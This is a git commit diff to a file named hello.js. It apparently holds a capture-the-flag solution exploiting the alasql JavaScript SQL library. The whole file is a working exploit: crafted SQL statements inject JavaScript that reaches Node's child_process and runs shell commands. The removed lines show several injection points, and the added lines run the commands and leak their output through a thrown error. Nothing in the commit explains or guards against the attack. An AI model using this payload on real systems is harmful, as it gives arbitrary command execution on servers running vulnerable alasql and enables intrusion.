625bd159c286d8b832b46e9ea43ede4017b3a6b7
Massy-J1 <jyc0x09@gmail.com>
2026-04-01 02:26:24 +0900

    a

--- hello.js
+++ hello.js
@@ -1,18 +1,19 @@
 const alasql = require('alasql');
 
-const genPayload = command => `
-new Function(
-    'return this.process.mainModule.require'
-)()('child_process').execSync(${JSON.stringify(command)})
+const genPayload = (command) => `
+(() => {
+  const req = new Function('return this.process.mainModule.require')();
+  const out = req('child_process').execSync(
+    ${JSON.stringify(command)},
+    { encoding: 'utf8' }
+  );
+  throw new Error(out.trim());
+})()
 `;
 
+const sql =
+  'CREATE TABLE i_am_a_table;' +
+  'INSERT INTO i_am_a_table VALUES (1337);' +
+  `UPDATE i_am_a_table SET [0'+${genPayload("sh -c 'pwd; ls -al; ./flag 2>&1'")}+']=42;`;
 
-res = alasql(
-    // Initialize the database
-    'CREATE table i_am_a_table;' +
-    `INSERT INTO i_am_a_table VALUES (1337);` +
-    `UPDATE i_am_a_table SET [0'+${genPayload(">&2 echo UPDATE pwned $(whoami)")}+']=42;` +
-    `SELECT * from i_am_a_table where whatever=['+${genPayload(">&2 echo SELECT pwned $(whoami)")}+'];` +
-    `SELECT \`'+${genPayload(">&2 echo SELECT pwned again, back-quote works too. $(whoami)")}+'\` from i_am_a_table where 1;` +
-    `SELECT [whatever||${genPayload('>&2 echo calling function pwned')}||]('whatever');`
-);
+alasql(sql);
